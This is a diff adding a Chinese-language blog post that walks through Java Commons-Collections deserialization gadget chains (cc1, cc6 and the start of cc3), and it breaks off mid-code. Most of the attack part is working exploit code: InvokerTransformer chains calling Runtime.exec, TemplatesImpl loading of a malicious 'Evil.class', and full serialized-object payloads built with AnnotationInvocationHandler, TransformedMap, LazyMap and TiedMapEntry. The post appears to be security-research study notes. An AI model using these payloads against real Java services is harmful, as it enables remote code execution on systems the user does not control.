+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>cc链在我理解可以分为两个部分</p>
+<ul>
+<li>执行恶意代码部分</li>
+<li>从readObject到执行恶意代码中间的链子</li>
+</ul>
+<p>那么后面的具体每一个cc链分析多为链子部分，执行恶意代码先放在前面介绍</p>
+<h1 id="执行恶意代码"><a href="#执行恶意代码" class="headerlink" title="执行恶意代码"></a>执行恶意代码</h1><h2 id="任意方法调用"><a href="#任意方法调用" class="headerlink" title="任意方法调用"></a>任意方法调用</h2><h3 id="InvokerTransformer-ChainedTransformer"><a href="#InvokerTransformer-ChainedTransformer" class="headerlink" title="InvokerTransformer+ChainedTransformer"></a>InvokerTransformer+ChainedTransformer</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer constantTransformer=<span class="built_in">new</span> ConstantTransformer(Runtime.class);</span><br><span class="line">InvokerTransformer getMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class,Class[].class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,null&#125;);</span><br><span class="line">InvokerTransformer invokeMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="built_in">new</span> Class[]&#123;Object.class,Object[].class&#125;, <span class="built_in">new</span> Object[]&#123;null,null&#125;);</span><br><span class="line">InvokerTransformer execMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;code&quot;</span>&#125;);</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(<span class="built_in">new</span> Transformer[]&#123;constantTransformer,getMethod,invokeMethod,execMethod&#125;);</span><br><span class="line">chainedTransformer.transform(null);</span><br></pre></td></tr></table></figure>
+<h2 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>TemplatesImpl中实现了动态类加载,这个也是从ClassLoader里面搜defineClass的调用搜到的<br>利用下图所示的进行任意类加载<img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698975470562-8b229f49-13fb-4736-9572-62b9c91a4deb.png#averageHue=%23f8f8f8&clientId=u923e8ca8-dbd9-4&from=drop&id=u05f4048f&originHeight=428&originWidth=1460&originalType=binary&ratio=2&rotation=0&showTitle=false&size=376466&status=done&style=none&taskId=udd9e86b5-3fb0-4ee1-acf8-60314ab18b4&title=" alt="截屏2023-11-03 09.37.46.png"></p>
+<h4 id="任意类加载demo"><a href="#任意类加载demo" class="headerlink" title="任意类加载demo"></a>任意类加载demo</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil.class&quot;</span>));</span><br><span class="line">        TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">        Field bytecodes = templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field _tfactory = templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _tfactory.set(templates,<span class="built_in">new</span> TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure>
+<p>有如下几个点注意</p>
+<ul>
+<li>name需要设置不为空即可</li>
+<li>bytecode即恶意类代码</li>
+<li>_tfactory需要设置，不然报错</li>
+<li>加载的类要求继承AbstractTranslet</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699020093605-0d426d8e-e3b5-49f2-be6e-3dc78ca6e92b.png#averageHue=%2325272a&clientId=uc8f9044e-263b-4&from=drop&id=u7374094e&originHeight=614&originWidth=936&originalType=binary&ratio=2&rotation=0&showTitle=false&size=358208&status=done&style=none&taskId=u9deb2a80-303a-4684-ab91-f0c8e1ac3c0&title=" alt="截屏2023-11-03 22.01.27.png"><br>直接反射去调用defineTransletClasses或者defineClass都是没用的，因为defineClass不会去加载类，只是load进来所以我们在getTransletInstance可以看到，在把class load进来后，会在下面的newInstance时候触发我们的静态方法（静态方法在构造函数调用之前执行）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698840362939-895724de-9dbb-4006-819c-bf4e43f75f34.png#averageHue=%2326282b&clientId=u00b9e088-0f93-4&from=drop&id=Mqti6&originHeight=534&originWidth=1302&originalType=binary&ratio=2&rotation=0&showTitle=false&size=437166&status=done&style=none&taskId=u74106f30-ec7f-4263-9b5a-9cc7782c623&title=" alt="截屏2023-11-01 20.05.59.png">解释一下为什么一定要继承对应的类<br>因为在defineTransletClasses函数里,Index默认是-1 &lt;0<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699057676589-aee51a03-ed5f-40fd-9217-59adadc2369d.png#averageHue=%23232528&clientId=uc8f9044e-263b-4&from=drop&id=AkFUn&originHeight=154&originWidth=626&originalType=binary&ratio=2&rotation=0&showTitle=false&size=68174&status=done&style=none&taskId=ucd29555b-a832-41b3-b427-07c5bda9296&title=" alt="截屏2023-11-04 08.27.48.png"><br>而如果&lt;0会直接在defineTransletClasses里抛异常，就走不到后面newInstance了，所以这里我们要让Index&gt;&#x3D;0，而要让他&gt;&#x3D;0就要满足继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698931538895-fd3432ba-5992-44cb-963c-1ffdf6b6805e.png#averageHue=%2326272a&clientId=u2947e948-9e44-4&from=drop&id=Bk34R&originHeight=760&originWidth=1222&originalType=binary&ratio=2&rotation=0&showTitle=false&size=581767&status=done&style=none&taskId=u70bec353-4072-42ce-b312-2318ff1cf07&title=" alt="截屏2023-11-02 21.25.31.png"><br>当然如果嫌继承麻烦也可以这样写</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil2.class&quot;</span>));</span><br><span class="line">        TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">        Field bytecodes = templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field transletIndex = templates.getClass().getDeclaredField(<span class="string">&quot;_transletIndex&quot;</span>);</span><br><span class="line">        transletIndex.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transletIndex.set(templates,<span class="number">0</span>);</span><br><span class="line">        Field _tfactory = templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _tfactory.set(templates,<span class="built_in">new</span> TransformerFactoryImpl());</span><br><span class="line">        Field auxClasses = templates.getClass().getDeclaredField(<span class="string">&quot;_auxClasses&quot;</span>);</span><br><span class="line">        auxClasses.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        auxClasses.set(templates,<span class="built_in">new</span> HashMap&lt;&gt;());</span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure>
+<p>这样写的方法就是，我们通过一些反射等操作让他能够走这样的逻辑，但是需要修改如_auxClasses,_transletIndex等变量，但是好处是类可以这样定义<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699068169757-34ffb153-648b-46a9-acf4-e6aee2e7166c.png#averageHue=%2324262b&clientId=uc8f9044e-263b-4&from=drop&id=u12b7d1a3&originHeight=470&originWidth=1144&originalType=binary&ratio=2&rotation=0&showTitle=false&size=309349&status=done&style=none&taskId=u9fa491a5-ede5-426e-928a-2731d79c9db&title=" alt="截屏2023-11-04 11.22.42.png"><br>接下来就是如何触发newTransformer,有两种方法</p>
+<h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><h4 id="利用TrAXFilter"><a href="#利用TrAXFilter" class="headerlink" title="利用TrAXFilter"></a>利用TrAXFilter</h4><p>我们发现这个类的构造函数里面调用了newTransformer，那么能不能去调用这个构造函数并且让他传入的参数是templates<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698841805764-590884ab-de54-4ad1-b9cf-9a45d0a30623.png#averageHue=%2327282c&clientId=u00b9e088-0f93-4&from=drop&id=zgz24&originHeight=400&originWidth=1268&originalType=binary&ratio=2&rotation=0&showTitle=false&size=332768&status=done&style=none&taskId=ud5718abb-fd01-43a5-8a89-4119d43a629&title=" alt="截屏2023-11-01 20.30.03.png"><br>我们发现InstantiateTransformer的transform刚好可以实现这样的需求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698841925903-effc1018-5669-417e-82f7-f09bc2b78643.png#averageHue=%23252629&clientId=u00b9e088-0f93-4&from=drop&id=SnES4&originHeight=468&originWidth=1574&originalType=binary&ratio=2&rotation=0&showTitle=false&size=455198&status=done&style=none&taskId=ue6ae9679-d3d7-469b-b53e-2cf91dc00e5&title=" alt="截屏2023-11-01 20.32.02.png"></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil.class&quot;</span>));</span><br><span class="line">        TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">        Field bytecodes = templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field _tfactory = templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _tfactory.set(templates,<span class="built_in">new</span> TransformerFactoryImpl());</span><br><span class="line">        ConstantTransformer constantTransformer = <span class="built_in">new</span> ConstantTransformer(TrAXFilter.class);</span><br><span class="line">        InstantiateTransformer instantiateTransformer = <span class="built_in">new</span> InstantiateTransformer(<span class="built_in">new</span> Class[]&#123;Templates.class&#125;, <span class="built_in">new</span> Object[]&#123;templates&#125;);</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(<span class="built_in">new</span> Transformer[]&#123;constantTransformer, instantiateTransformer&#125;);</span><br><span class="line">        chainedTransformer.transform(null);</span><br></pre></td></tr></table></figure>
+<h4 id="利用InvokerTransformer"><a href="#利用InvokerTransformer" class="headerlink" title="利用InvokerTransformer"></a>利用InvokerTransformer</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil.class&quot;</span>));</span><br><span class="line">       TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">       Field bytecodes = templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">       Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       Field _tfactory = templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">       _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       _tfactory.set(templates,<span class="built_in">new</span> TransformerFactoryImpl());</span><br><span class="line">       ConstantTransformer constantTransformer = <span class="built_in">new</span> ConstantTransformer(templates);</span><br><span class="line">       InvokerTransformer newTransformer = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, null, null);</span><br><span class="line">       ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(<span class="built_in">new</span> Transformer[]&#123;constantTransformer, newTransformer&#125;);</span><br><span class="line">       chainedTransformer.transform(null);</span><br></pre></td></tr></table></figure>
+<p>一个小细节<br>对于无参的方法反射获取的时候<br>正确的写法是下面这种<br>Runtime.class.getMethod(“getRuntime”,null);<br>下面这种写法会报错，methodnotexist（可以理解为还是传了参数的，不太一样）<br>Runtime.class.getMethod(“getRuntime”,new Class[]{null});</p>
+<h3 id="FactoryTransformer"><a href="#FactoryTransformer" class="headerlink" title="FactoryTransformer"></a>FactoryTransformer</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699272886359-6f2cd000-1d1c-4047-9efb-f5d974e067e2.png#averageHue=%23282a2e&clientId=u574e201a-7720-4&from=drop&id=uf0142383&originHeight=150&originWidth=680&originalType=binary&ratio=2&rotation=0&showTitle=false&size=75902&status=done&style=none&taskId=u63e6dba0-ae65-4d8c-9339-dd9fb88f0ad&title=" alt="截屏2023-11-06 20.14.42.png"><br>InstantiateFactory这里可以构造一个TrAXFilter的实例，进而加载恶意类代码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699272903445-ea55bf59-7f7c-416d-b4fb-ea6ea858354d.png#averageHue=%23272c36&clientId=u574e201a-7720-4&from=drop&id=u84520a43&originHeight=338&originWidth=956&originalType=binary&ratio=2&rotation=0&showTitle=false&size=205367&status=done&style=none&taskId=uda038f0b-9946-43f2-99cf-2d8f2c60754&title=" alt="截屏2023-11-06 20.14.59.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699272916198-b13b232c-4ff9-4ad7-b9c4-dccc9d36a370.png#averageHue=%2326272b&clientId=u574e201a-7720-4&from=drop&id=uf9c52f49&originHeight=282&originWidth=1408&originalType=binary&ratio=2&rotation=0&showTitle=false&size=264855&status=done&style=none&taskId=u82884ad4-a3f3-49dc-8c85-1f950606d04&title=" alt="截屏2023-11-06 20.15.11.png"><br>FactoryTransformer的好处是，调用tansform的时候不需要管传递参数</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil.class&quot;</span>));</span><br><span class="line">        TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">        Field bytecodes = templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field _tfactory = templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _tfactory.set(templates,<span class="built_in">new</span> TransformerFactoryImpl());</span><br><span class="line">        InstantiateFactory instantiateFactory = <span class="built_in">new</span> InstantiateFactory(TrAXFilter.class, <span class="built_in">new</span> Class[]&#123;Templates.class&#125;, <span class="built_in">new</span> Object[]&#123;templates&#125;);</span><br><span class="line">        FactoryTransformer factoryTransformer = <span class="built_in">new</span> FactoryTransformer(instantiateFactory);</span><br><span class="line">        factoryTransformer.transform(null);</span><br></pre></td></tr></table></figure>
+<h1 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h1><p>CommonsCollections &lt;&#x3D; 3.2.1<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699068903273-997aa9cc-e1ad-48c8-a7ff-18ae7d0a695d.png#averageHue=%23f9f9f9&clientId=uc8f9044e-263b-4&from=drop&id=u49f2994e&originHeight=532&originWidth=1512&originalType=binary&ratio=2&rotation=0&showTitle=false&size=484200&status=done&style=none&taskId=u0db13354-677e-43c1-b737-ca366d84e4c&title=" alt="截屏2023-11-04 11.34.57.png"></p>
+<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><p>jdk &lt; 8u71</p>
+<h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>TransformedMap的checkSetValue会触发最后的transform<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698925152962-1952cb9a-14c4-4906-9e38-de96e34003a1.png#averageHue=%2325262b&clientId=u2947e948-9e44-4&from=drop&id=u9d14a8b4&originHeight=184&originWidth=690&originalType=binary&ratio=2&rotation=0&showTitle=false&size=105287&status=done&style=none&taskId=ubbb420df-938b-4087-ba3f-e87ba01f42b&title=" alt="截屏2023-11-02 19.39.09.png"><br>AbstractInputCheckedMapDecorator(TransformedMap继承了AbstractInputCheckedMapDecorator)的MapEntry的setValue会触发checkSetValue<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698925211627-d0c9cd22-130a-45db-b297-2eca3a003440.png#averageHue=%23232428&clientId=u2947e948-9e44-4&from=drop&id=u843766b6&originHeight=664&originWidth=1080&originalType=binary&ratio=2&rotation=0&showTitle=false&size=477545&status=done&style=none&taskId=u8823f924-65d5-4f38-85c4-32e5db2ad14&title=" alt="截屏2023-11-02 19.40.07.png"><br>AnnotationInvocationHandler的readObject会调用setValue,进而构造成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698926560322-5d6f423a-d3e6-4389-bff3-469c3a31c5f1.png#averageHue=%23232428&clientId=u2947e948-9e44-4&from=drop&id=u79500752&originHeight=886&originWidth=1660&originalType=binary&ratio=2&rotation=0&showTitle=false&size=948376&status=done&style=none&taskId=u72340096-0cbb-48e0-8107-3ce89bfc465&title=" alt="截屏2023-11-02 20.02.33.png"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer constantTransformer = <span class="built_in">new</span> ConstantTransformer(Runtime.class);</span><br><span class="line">InvokerTransformer getRuntime = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class,Class[].class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,null&#125;);</span><br><span class="line">InvokerTransformer invoke = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="built_in">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="built_in">new</span> Object[]&#123;null,null&#125;);</span><br><span class="line">InvokerTransformer exec = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;);</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(<span class="built_in">new</span> Transformer[]&#123;constantTransformer, getRuntime, invoke, exec&#125;);</span><br><span class="line">HashedMap hashedMap = <span class="built_in">new</span> HashedMap();</span><br><span class="line">hashedMap.put(<span class="string">&quot;output&quot;</span>,<span class="number">1</span>);</span><br><span class="line">TransformedMap transformedMap = (TransformedMap) TransformedMap.decorate(hashedMap, <span class="built_in">new</span> ConstantTransformer(<span class="string">&quot;a&quot;</span>),chainedTransformer);</span><br><span class="line">Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; declaredConstructor = AnnotationInvocationHandler.getDeclaredConstructor(<span class="built_in">new</span> Class[]&#123;Class.class, Map.class&#125;);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object o = declaredConstructor.newInstance(<span class="built_in">new</span> Object[]&#123;Action.class, transformedMap&#125;);</span><br><span class="line">serialize(o);</span><br><span class="line">deserialize();</span><br></pre></td></tr></table></figure>
+<h3 id="小细节"><a href="#小细节" class="headerlink" title="小细节"></a>小细节</h3><ul>
+<li>valueTransform才会调用transform，所以放在第三个</li>
+<li>hashmap一定要有值，不然不能遍历</li>
+<li>output是调试出来的值，一共有3个可以选</li>
+<li>1是随便填的，只要不是字符串就可以,甚至字符就可以,因为output获取的类刚好是String，然后后面只有不是对应类的才可以进入if</li>
+<li>另外实例化transformedMap的第一个参数要是接口，并且是继承于Annotation就可以</li>
+</ul>
+<h1 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699080373877-b22b273a-3ce8-43e3-979e-576999bb41ff.png#averageHue=%23f9f9f9&clientId=uc8f9044e-263b-4&from=drop&id=u4f462f9f&originHeight=616&originWidth=1668&originalType=binary&ratio=2&rotation=0&showTitle=false&size=687881&status=done&style=none&taskId=ube172b8b-3b58-4644-937e-1ed51b70623&title=" alt="截屏2023-11-04 14.46.08.png"></p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>这里hashMap在put的时候会自动调用hash方法，所以我们先给tiedMapEntry随便传一个map，后面在反射改掉</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer constantTransformer=<span class="built_in">new</span> ConstantTransformer(Runtime.class);</span><br><span class="line">        InvokerTransformer getMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class,Class[].class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,null&#125;);</span><br><span class="line">        InvokerTransformer invokeMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="built_in">new</span> Class[]&#123;Object.class,Object[].class&#125;, <span class="built_in">new</span> Object[]&#123;null,null&#125;);</span><br><span class="line">        InvokerTransformer execMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;code&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers=<span class="built_in">new</span> Transformer[]&#123;constantTransformer,getMethod,invokeMethod,execMethod&#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(<span class="built_in">new</span> HashMap(), chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="built_in">new</span> TiedMapEntry(<span class="built_in">new</span> HashMap(),<span class="string">&quot;b&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="built_in">new</span> HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Field <span class="keyword">map</span> = tiedMapEntry.getClass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        <span class="keyword">map</span>.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">map</span>.set(tiedMapEntry,lazyMap);</span><br><span class="line">		serialize(hashMap);</span><br></pre></td></tr></table></figure>
+<h1 id="cc3"><a href="#cc3" class="headerlink" title="cc3"></a>cc3</h1><p>cc3&#x3D;cc1链子+类加载<br>这里我也不走cc1了，直接换成cc6链子+类加载</p>
+<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><h3 id="TrAXFilte"><a href="#TrAXFilte" class="headerlink" title="TrAXFilte"></a>TrAXFilte</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil.class&quot;</span>));</span><br><span class="line">        TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">        Field bytecodes = templates.getClass().getDeclaredField(<span 